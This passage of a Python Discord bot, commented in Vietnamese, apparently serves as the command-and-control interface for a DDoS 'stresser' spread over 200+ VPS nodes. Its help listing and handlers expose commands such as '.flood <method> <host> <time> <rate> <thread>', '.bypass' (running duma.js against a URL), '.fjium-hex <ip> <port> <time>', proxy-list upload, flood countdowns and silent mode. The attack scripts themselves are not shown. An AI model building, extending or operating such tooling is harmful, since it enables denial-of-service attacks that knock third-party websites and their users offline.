        name="📊 Thông tin phản hồi",
        value=f"**Response Counter:** {RESPONSE_COUNTER}\n**Message Tracker:** {len(MESSAGE_SENT_TRACKER)}\n**Response VPS:** {RESPONSE_VPS or 'None'}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Manual Silent:** {'✅ Có' if MANUAL_SILENT_MODE else '❌ Không'}",
        inline=False
    )
    
    embed.add_field(
        name="🔧 Hành động",
        value="Sử dụng `.reset_spam` để reset hệ thống chống spam",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def reset_spam(ctx):
    """Reset hệ thống chống spam"""
    global RESPONSE_COUNTER, MESSAGE_SENT_TRACKER, RESPONSE_VPS, SILENT_MODE, MANUAL_SILENT_MODE
    
    old_counter = RESPONSE_COUNTER
    old_tracker_size = len(MESSAGE_SENT_TRACKER)
    old_response_vps = RESPONSE_VPS
    
    # Reset tất cả
    RESPONSE_COUNTER = 0
    MESSAGE_SENT_TRACKER.clear()
    RESPONSE_VPS = None
    SILENT_MODE = False
    MANUAL_SILENT_MODE = False
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Reset Spam System",
        color=discord.Color.green()
    )
    
    embed.add_field(
        name="📊 Trước khi reset",
        value=f"**Response Counter:** {old_counter}\n**Message Tracker:** {old_tracker_size}\n**Response VPS:** {old_response_vps or 'None'}",
        inline=True
    )
    
    embed.add_field(
        name="📊 Sau khi reset",
        value=f"**Response Counter:** {RESPONSE_COUNTER}\n**Message Tracker:** {len(MESSAGE_SENT_TRACKER)}\n**Response VPS:** {RESPONSE_VPS or 'None'}",
        inline=True
    )
    
    embed.add_field(
        name="ℹ️ Thông tin",
        value="Hệ thống đã được reset. VPS phản hồi nhanh nhất sẽ trở thành VPS chính.",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def test(ctx):
    """Test bot hoạt động"""
    embed = discord.Embed(
        title=f"✅ [{VPS_NAME}] Bot Test",
        description="Bot đang hoạt động bình thường!",
        color=discord.Color.green()
    )
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def test_stop(ctx):
    """Test lệnh stop với process giả"""
    global is_running, current_process
    
    # Kiểm tra xem VPS này có nên phản hồi không
    is_main_vps = await should_respond()
    if not is_main_vps:
        silent_log("Nhận lệnh test_stop từ VPS khác")
        return
    
    if is_running:
        embed = discord.Embed(
            description=f"⚠️ [{VPS_NAME}] Bot đang bận, sử dụng `.stop` để dừng trước!",
            color=discord.Color.orange()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    # Tạo process giả để test
    is_running = True
    embed = discord.Embed(
        description=f"🧪 [{VPS_NAME}] Đang tạo process test...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        # Tạo process sleep để test
        current_process = await asyncio.create_subprocess_shell(
            "timeout 10 sleep 10" if platform.system() != "Windows" else "timeout 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        embed = discord.Embed(
            description=f"✅ [{VPS_NAME}] Process test đã tạo! Sử dụng `.stop` để dừng.",
            color=discord.Color.green()
        )
        await safe_send_message(ctx, embed, 0.1)
        
        # Chờ process hoàn thành hoặc bị dừng
        await current_process.communicate()
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi test: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
    finally:
        is_running = False
        current_process = None

@bot.command()
async def test_kill(ctx):
    """Test lệnh kill với process thật"""
    global is_running, current_process
    
    # Kiểm tra xem VPS này có nên phản hồi không
    is_main_vps = await should_respond()
    if not is_main_vps:
        silent_log("Nhận lệnh test_kill từ VPS khác")
        return
    
    if is_running:
        embed = discord.Embed(
            description=f"⚠️ [{VPS_NAME}] Bot đang bận, sử dụng `.stop` để dừng trước!",
            color=discord.Color.orange()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    # Tạo process thật để test
    is_running = True
    embed = discord.Embed(
        description=f"🧪 [{VPS_NAME}] Đang tạo process test thật...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        # Tạo process Node.js thật để test
        current_process = await asyncio.create_subprocess_shell(
            "node -e 'setInterval(() => console.log(\"Running...\"), 1000)'",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        embed = discord.Embed(
            description=f"✅ [{VPS_NAME}] Process test thật đã tạo! Sử dụng `.stop` để dừng.",
            color=discord.Color.green()
        )
        await safe_send_message(ctx, embed, 0.1)
        
        # Chờ process hoàn thành hoặc bị dừng
        await current_process.communicate()
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi test: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
    finally:
        is_running = False
        current_process = None

@bot.command()
async def silent(ctx, mode: str = None):
    """Bật/tắt chế độ im lặng cho bot"""
    global SILENT_MODE, MANUAL_SILENT_MODE
    
    try:
        if mode is None:
            # Hiển thị trạng thái hiện tại
            embed = discord.Embed(
                title=f"🔇 [{VPS_NAME}] Chế độ im lặng",
                description=f"**Trạng thái:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Manual Mode:** {'✅ Có' if MANUAL_SILENT_MODE else '❌ Không'}\n\n**Mô tả:** Khi bật, bot sẽ chạy lệnh nhưng không gửi tin nhắn phản hồi",
                color=discord.Color.blue() if SILENT_MODE else discord.Color.green()
            )
            
            embed.add_field(
                name="📋 Cách sử dụng",
                value="`.silent on` - Bật chế độ im lặng\n`.silent off` - Tắt chế độ im lặng\n`.silent` - Xem trạng thái",
                inline=False
            )
            
            await safe_send_message(ctx, embed, 0.1)
            return
        
        mode = mode.lower()
        
        if mode in ["on", "true", "1", "bật", "enable"]:
            SILENT_MODE = True
            MANUAL_SILENT_MODE = True
            status = "🔇 Bật"
            color = discord.Color.orange()
            message = "Bot sẽ chạy lệnh nhưng không gửi tin nhắn phản hồi"
        elif mode in ["off", "false", "0", "tắt", "disable"]:
            SILENT_MODE = False
            MANUAL_SILENT_MODE = False
            status = "🔊 Tắt"
            color = discord.Color.green()
            message = "Bot sẽ gửi tin nhắn phản hồi bình thường"
        else:
            embed = discord.Embed(
                title=f"❌ [{VPS_NAME}] Lỗi tham số",
                description="**Giá trị hợp lệ:**\n• `on/true/1/bật/enable` - Bật im lặng\n• `off/false/0/tắt/disable` - Tắt im lặng",
                color=discord.Color.red()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
        
        embed = discord.Embed(
            title=f"⚙️ [{VPS_NAME}] Chế độ im lặng",
            description=f"**Trạng thái:** {status}\n**Mô tả:** {message}",
            color=color
        )
        
        await safe_send_message(ctx, embed, 0.1)
        logger.info(f"Silent mode {'enabled' if SILENT_MODE else 'disabled'} by {ctx.author.name}")
    
    except Exception as e:
        print(f"❌ [{VPS_NAME}] Lỗi trong lệnh silent: {e}")
        logger.error(f"Lỗi trong lệnh silent: {e}")
        
        # Gửi thông báo lỗi
        error_embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi lệnh silent",
            description=f"Đã xảy ra lỗi: {str(e)}",
            color=discord.Color.red()
        )
        try:
            await ctx.send(embed=error_embed)
        except:
            pass  # Nếu không gửi được tin nhắn, bỏ qua

@bot.command()
async def connection_status(ctx):
    """Kiểm tra trạng thái kết nối của bot"""
    global CONNECTION_HEALTHY, CONNECTION_RETRY_COUNT, LAST_CONNECTION_TIME
    
    # Kiểm tra kết nối hiện tại
    is_healthy = await check_connection_health()
    
    embed = discord.Embed(
        title=f"🔗 [{VPS_NAME}] Trạng thái kết nối",
        color=discord.Color.green() if is_healthy else discord.Color.red()
    )
    
    # Thông tin cơ bản
    embed.add_field(
        name="📊 Thông tin kết nối",
        value=f"**Trạng thái:** {'✅ Ổn định' if is_healthy else '❌ Không ổn định'}\n**Bot Ready:** {'✅ Có' if bot.is_ready() else '❌ Không'}\n**Guilds:** {len(bot.guilds)}\n**Retry Count:** {CONNECTION_RETRY_COUNT} {'(liên tục)' if CONTINUOUS_RECONNECT else f'/{MAX_RETRY_ATTEMPTS}'}\n**Continuous Reconnect:** {'🔄 Bật' if CONTINUOUS_RECONNECT else '🛑 Tắt'}",
        inline=False
    )
    
    # Thông tin thời gian
    if LAST_CONNECTION_TIME:
        last_conn = datetime.fromtimestamp(LAST_CONNECTION_TIME).strftime("%Y-%m-%d %H:%M:%S")
        embed.add_field(
            name="⏰ Thời gian",
            value=f"**Lần kết nối cuối:** {last_conn}\n**Uptime:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            inline=False
        )
    
    # Thông tin VPS và Load Balancing
    group_id = get_vps_group(VPS_NAME)
    group_size = len(VPS_GROUPS.get(group_id, []))
    embed.add_field(
        name="🖥️ VPS Info",
        value=f"**VPS Name:** {VPS_NAME}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Response VPS:** {RESPONSE_VPS or 'Chưa xác định'}\n**Group ID:** {group_id}\n**Group Size:** {group_size}",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def load_balance_status(ctx):
    """Kiểm tra trạng thái load balancing cho 200+ VPS"""
    global VPS_GROUPS, MAX_VPS_PER_GROUP
    
    embed = discord.Embed(
        title=f"⚖️ [{VPS_NAME}] Load Balancing Status",
        color=discord.Color.blue()
    )
    
    # Thông tin tổng quan
    total_vps = sum(len(group) for group in VPS_GROUPS.values())
    total_groups = len(VPS_GROUPS)
    current_group = get_vps_group(VPS_NAME)
    
    embed.add_field(
        name="📊 Tổng quan",
        value=f"**Tổng VPS:** {total_vps}\n**Tổng Groups:** {total_groups}\n**Max VPS/Group:** {MAX_VPS_PER_GROUP}\n**Current Group:** {current_group}",
        inline=False
    )
    
    # Thông tin từng group
    group_info = []
    for group_id, vps_list in VPS_GROUPS.items():
        group_size = len(vps_list)
        status = "🟢 OK" if group_size < MAX_VPS_PER_GROUP else "🟡 Full" if group_size == MAX_VPS_PER_GROUP else "🔴 Over"
        group_info.append(f"**Group {group_id}:** {group_size} VPS {status}")
    
    if group_info:
        embed.add_field(
            name="📋 Chi tiết Groups",
            value="\n".join(group_info),
            inline=False
        )
    
    # Thông tin VPS hiện tại
    current_group_vps = VPS_GROUPS.get(current_group, [])
    embed.add_field(
        name="🎯 VPS hiện tại",
        value=f"**VPS Name:** {VPS_NAME}\n**Group:** {current_group}\n**Group VPS:** {len(current_group_vps)}\n**Should Respond:** {'✅ Có' if should_respond_in_group(VPS_NAME) else '❌ Không'}",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_continuous_reconnect(ctx, enable: str):
    """Bật/tắt chế độ reconnect liên tục"""
    global CONTINUOUS_RECONNECT
    
    enable = enable.lower()
    
    if enable in ["on", "true", "1", "bật", "enable"]:
        CONTINUOUS_RECONNECT = True
        status = "🔄 Bật"
        color = discord.Color.green()
        message = "Bot sẽ liên tục thử kết nối lại cho đến khi thành công"
    elif enable in ["off", "false", "0", "tắt", "disable"]:
        CONTINUOUS_RECONNECT = False
        status = "🛑 Tắt"
        color = discord.Color.red()
        message = "Bot sẽ dừng thử kết nối lại sau số lần thử tối đa"
    else:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi tham số",
            description="**Giá trị hợp lệ:**\n• `on/true/1/bật/enable` - Bật reconnect liên tục\n• `off/false/0/tắt/disable` - Tắt reconnect liên tục",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Continuous Reconnect",
        description=f"**Trạng thái:** {status}\n**Mô tả:** {message}\n**Retry Count:** {CONNECTION_RETRY_COUNT}",
        color=color
    )
    
    await safe_send_message(ctx, embed, 0.1)
    logger.info(f"Continuous reconnect {'enabled' if CONTINUOUS_RECONNECT else 'disabled'} by {ctx.author.name}")

@bot.command()
async def commands(ctx):
    embed = discord.Embed(
        title="📋 Danh sách lệnh",
        description="Bot hỗ trợ các lệnh sau:",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="`.bypass <url> <time>`",
        value="Chạy duma.js với URL và thời gian",
        inline=False
    )
    
    embed.add_field(
        name="`.human <url> <time>`",
        value="Chạy human.js với URL và thời gian",
        inline=False
    )
    
    embed.add_field(
        name="`.flood <method> <host> <time> <rate> <thread>`",
        value="Chạy flood.js với các tham số",
        inline=False
    )
    
    embed.add_field(
        name="`.fjium-hex <ip> <port> <time>`",
        value="Chạy file fjium-hex với IP, port và thời gian (tự động cấp quyền thực thi)",
        inline=False
    )
    
    embed.add_field(
        name="`.stop`",
        value="Dừng tất cả process đang chạy (gộp stop, force_stop, kill)",
        inline=False
    )
    
    embed.add_field(
        name="`.upload`",
        value="Upload file proxies.txt (đính kèm file)",
        inline=False
    )
    
    embed.add_field(
        name="`.proxies`",
        value="Xem thông tin file proxies.txt",
        inline=False
    )
    
    embed.add_field(
        name="`.status`",
        value="Kiểm tra trạng thái VPS hiện tại",
        inline=False
    )
    
    embed.add_field(
        name="`.connection_status`",
        value="Kiểm tra trạng thái kết nối Discord",
        inline=False
    )
    
    embed.add_field(
        name="`.load_balance_status`",
        value="Kiểm tra trạng thái load balancing cho 200+ VPS",
        inline=False
    )
    
    embed.add_field(
        name="`.set_continuous_reconnect`",
        value="Bật/tắt chế độ reconnect liên tục",
        inline=False
    )
    
    embed.add_field(
        name="`.limits`",
        value="Hiển thị giới hạn hệ thống",
        inline=False
    )
    
    embed.add_field(
        name="`.optimize <method> <host> <time> <rate> <thread>`",
        value="Tối ưu hóa lệnh trước khi chạy",
        inline=False
    )
    
    embed.add_field(
        name="`.stats`",
        value="Hiển thị thống kê chi tiết",
        inline=False
    )
    
    embed.add_field(
        name="`.reset_stats`",
        value="Reset thống kê",
        inline=False
    )
    
    embed.add_field(
        name="`.optimize_system`",
        value="Tối ưu hóa toàn bộ hệ thống (RAM + CPU)",
        inline=False
    )
    
    embed.add_field(
        name="`.cleanup_memory`",
        value="Dọn dẹp bộ nhớ",
        inline=False
    )
    
    embed.add_field(
        name="`.cleanup_temp`",
        value="Dọn dẹp file tạm",
        inline=False
    )
    
    embed.add_field(
        name="`.kill_zombies`",
        value="Kill zombie processes",
        inline=False
    )
    
    embed.add_field(
        name="`.system_info`",
        value="Hiển thị thông tin hệ thống",
        inline=False
    )
    
    embed.add_field(
        name="`.queue_status`",
        value="Kiểm tra trạng thái queue",
        inline=False
    )
    
    embed.add_field(
        name="`.silent_status`",
        value="Kiểm tra trạng thái silent mode",
        inline=False
    )
    
    embed.add_field(
        name="`.set_response_vps <vps_name>`",
        value="Thay đổi VPS chính phản hồi",
        inline=False
    )
    
    embed.add_field(
        name="`.reset_response_vps`",
        value="Reset VPS chính (tự động chọn VPS nhanh nhất)",
        inline=False
    )
    
    embed.add_field(
        name="`.set_limit <type> <value>`",
        value="Set giới hạn hệ thống (time/rate/thread/cooldown)",
        inline=False
    )
    
    embed.add_field(
        name="`.get_limits`",
        value="Xem giới hạn hiện tại",
        inline=False
    )
    
    embed.add_field(
        name="`.reset_limits`",
        value="Reset tất cả giới hạn về mặc định",
        inline=False
    )
    
    embed.add_field(
        name="`.reset_message_tracker`",
        value="Reset message tracker để tránh lặp tin nhắn",
        inline=False
    )
    
    embed.add_field(
        name="`.clear_cooldowns`",
        value="Xóa tất cả cooldown của user",
        inline=False
    )
    
    embed.add_field(
        name="`.set_vps_mode <mode>`",
        value="Thay đổi chế độ chọn VPS (random/speed/fixed)",
        inline=False
    )
    
    embed.add_field(
        name="`.vps_status`",
        value="Xem trạng thái hệ thống VPS",
        inline=False
    )
    
    embed.add_field(
        name="`.force_reset_vps`",
        value="Bắt buộc reset VPS chính ngay lập tức",
        inline=False
    )
    
    embed.add_field(
        name="`.set_reset_interval <seconds>`",
        value="Thay đổi thời gian reset VPS chính (60-3600s)",
        inline=False
    )
    
    embed.add_field(
        name="`.debug_vps`",
        value="Debug thông tin VPS chi tiết",
        inline=False
    )
    
    embed.add_field(
        name="`.set_auto_failover <enable>`",
        value="Bật/tắt tự động failover (true/false)",
        inline=False
    )
    
    embed.add_field(
        name="`.set_vps_timeout <seconds>`",
        value="Thay đổi thời gian timeout VPS (30-600s)",
        inline=False
    )
    
    embed.add_field(
        name="`.alive_vps`",
        value="Xem danh sách VPS còn sống",
        inline=False
    )
    
    embed.add_field(
        name="`.set_countdown <enable>`",
        value="Bật/tắt countdown thời gian flood (true/false)",
        inline=False
    )
    
    embed.add_field(
        name="`.set_countdown_interval <seconds>`",
        value="Thay đổi interval countdown (5-60s)",
        inline=False
    )
    
    embed.add_field(
        name="`.set_final_countdown <seconds>`",
        value="Thay đổi thời gian final countdown (10-120s)",
        inline=False
    )
    
    embed.add_field(
        name="`.countdown_status`",
        value="Xem trạng thái countdown",
        inline=False
    )
    
    embed.add_field(
        name="`.debug_spam`",
        value="Debug thông tin spam và hệ thống",
        inline=False
    )
    
    embed.add_field(
        name="`.reset_spam`",
        value="Reset hệ thống chống spam",
        inline=False
    )
    
    embed.add_field(
        name="`.test`",
        value="Test bot hoạt động",
        inline=False
    )
    
    embed.add_field(
        name="`.test_stop`",
        value="Test lệnh stop với process giả",
        inline=False
    )
    
    embed.add_field(
        name="`.test_kill`",
        value="Test lệnh kill với process thật",
        inline=False
    )
    
    embed.add_field(
        name="`.silent [on/off]`",
        value="Bật/tắt chế độ im lặng (bot chạy lệnh nhưng không gửi tin nhắn)",
        inline=False
    )
    
    embed.add_field(
        name="`.commands`",
        value="Hiển thị danh sách lệnh này",
        inline=False
    )
    
    embed.set_footer(text="Prefix: . | Chỉ có thể chạy 1 lệnh tại một thời điểm")
    
    await safe_send_message(ctx, embed, 0.1)

# Lệnh upload file proxies.txt
@bot.command()
async def upload(ctx):
    if not ctx.message.attachments:
        embed = discord.Embed(
            description="❌ Vui lòng đính kèm file proxies.txt!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    attachment = ctx.message.attachments[0]
    
    # Kiểm tra tên file
    if not attachment.filename.lower().endswith('.txt'):
        embed = discord.Embed(
            description="❌ File phải có định dạng .txt!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        # Tải file về
        content = await attachment.read()
        
        # Lưu file với tên proxies.txt
        with open('proxies.txt', 'wb') as f:
            f.write(content)
        
        # Đếm số dòng proxy
        proxy_count = len([line for line in content.decode('utf-8').split('\n') if line.strip()])
        
        embed = discord.Embed(
            description=f"✅ Upload thành công! Đã lưu {proxy_count} proxy vào file proxies.txt",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ Lỗi khi upload file: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# Lệnh xem thông tin file proxies.txt
@bot.command()
async def proxies(ctx):
    try:
        if not os.path.exists('proxies.txt'):
            embed = discord.Embed(
                description="❌ File proxies.txt chưa tồn tại! Sử dụng `.upload` để upload file.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            content = f.read()
        
        proxy_lines = [line.strip() for line in content.split('\n') if line.strip()]
        proxy_count = len(proxy_lines)
        
        if proxy_count == 0:
            embed = discord.Embed(
                description="⚠️ File proxies.txt trống!",
                color=discord.Color.orange()
            )
            await ctx.send(embed=embed)
            return
        
        # Hiển thị 5 proxy đầu tiên
        sample_proxies = proxy_lines[:5]
        sample_text = '\n'.join(sample_proxies)
        if proxy_count > 5:
            sample_text += f"\n... và {proxy_count - 5} proxy khác"
        
        embed = discord.Embed(
            title="📄 Thông tin file proxies.txt",
            description=f"**Tổng số proxy:** {proxy_count}\n\n**Mẫu proxy:**\n```\n{sample_text}\n```",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ Lỗi khi đọc file: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)


client.run(TOKEN)
